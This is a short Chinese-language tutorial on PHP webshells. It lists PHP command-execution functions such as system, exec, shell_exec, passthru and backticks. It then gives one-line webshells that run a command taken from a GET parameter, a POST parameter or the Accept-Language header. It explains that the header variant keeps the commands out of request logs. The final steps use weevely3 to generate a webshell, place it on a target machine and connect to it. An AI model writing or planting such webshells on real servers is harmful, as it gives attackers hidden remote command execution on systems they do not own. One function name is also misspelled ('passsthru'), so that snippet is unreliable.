---
title: PHP webshell 漏洞
tags: 技术
---

# webshells

    通过PHP脚本获取webshell

# PHP函数

## system()
```php
<?php
// Return the user the script is running under
system("whoami");
?>
```

## exec()
```
<?php
// Executes but returns nothing
exec("ls -la");
?>

<?php
// Executes, returns only last line of the output
echo exec("ls -la");
?>

<?php
// Executes, returns the output in an array
exec("ls -la",$array);
print_r($array);
?>
```

## shellexec()
```php
<?php
// Executes, returns the entire output as a string
echo shell_exec("ls -la");
?>
```

## passthru()
```php
<?php
// Executes, returns output in raw format
passsthru("ls -la");
?>
```

# Backticks
```php
<?php
$output = `whoami`;
echo "<pre>$output</pre>";
?>
```

## 所有函数合集
* exec
* system
* passthru
* shell_exec
* proc_open
* show_source
* parse_ini_file
* popen

# 构造webshell

    $_GET接收get请求的cmd参数内容
    system执行该参数
```php
<?php system($_GET['cmd']);?>
```
    将该文件webshell.php放到wwwroot目录下
    用浏览器发送get请求即可获取命令返回
```browser
http://ip:port/webshell.php?cmd=whoami
```

# 隐藏webshell

    由于上述get请求会被记录,可以很容易被看到
    可以将请求加入到post中
```php
<?php system($_POST['cmd']);?>
```
    将请求加入到header中
```php
<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
```

# 实战

> https://github.com/epinna/weevely3

    使用已经开发好的工具

1. 生成php脚本
```shell
./weevely.py generate passwd webshell.php
```

2. 脚本发送到目标机器上

3. 本地连接目标机器
```shell
./weevely.py http://ip/webshell.php passwd
weevely>  
```